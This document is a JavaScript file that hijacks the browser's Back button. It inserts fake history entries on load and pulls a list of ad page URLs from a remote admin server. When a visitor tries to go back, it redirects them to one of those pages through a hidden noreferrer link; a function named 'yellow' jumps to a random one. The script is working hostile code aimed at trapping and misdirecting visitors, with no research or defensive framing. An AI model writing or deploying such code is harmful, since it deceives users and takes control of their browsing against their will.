var globalLink = new Array();
//var apidomain =  location.hostname;
//var hostname  = apidomain.split('.');
//var apidomain = '//' + Math.random().toString(36).substr(2) + '.' + location.hostname + '/';
var apidomain = '//' + location.hostname + '/';

function hh() {
    history.pushState(history.length + 1, "message", "#" + new Date().getTime());
}

window.onload = function () {
    setTimeout('hh();', 50);
};

var fileArray = [];

// 广告
$.ajax({
    url: 'http://splb.admin.xunfengkj.com/api/manage/pages',
    //url: 'http://dev.admin.com/api/manage/pages',
    type: 'POST',
    data: '',
    dataType: 'json',
    async: false,
    success: function (data) {
        if (data) {
            for (var i = 0; i < data.length; i++) {
                fileArray.push(data[i]['name']);
                if (data[i]['name'].indexOf('http') != -1) {
                    globalLink.push(data[i]['name']);
                }else{
                    globalLink.push(apidomain + data[i]['name']);
                }
            }
        }
    },
    error: function (res) {
        console.log(res);
    }
});


// 后退
$(window).on('popstate', function (e) {
    var target = location.pathname.substr(1);
    var index  = fileArray.indexOf(target);
    var number = 0;
    if (index == (globalLink.length - 1) || index == -1) {
        number = 0;
    } else {
        number = index + 1;
    }
    jump(globalLink[number]);
});

// url跳转
function jump(url) {
    var a = document.createElement('a');
    a.setAttribute('rel', 'noreferrer');
    a.setAttribute('id', 'm_noreferrer');
    a.setAttribute('href', url);
    document.body.appendChild(a);
    document.getElementById('m_noreferrer').click();
    document.body.removeChild(a);
}

/**
 * @version  1.0
 * @author   eacher
 * @param
 * @return array | boolean
 */
function yellow() {
    jump(globalLink[Math.floor(globalLink.length * Math.random())]);
}
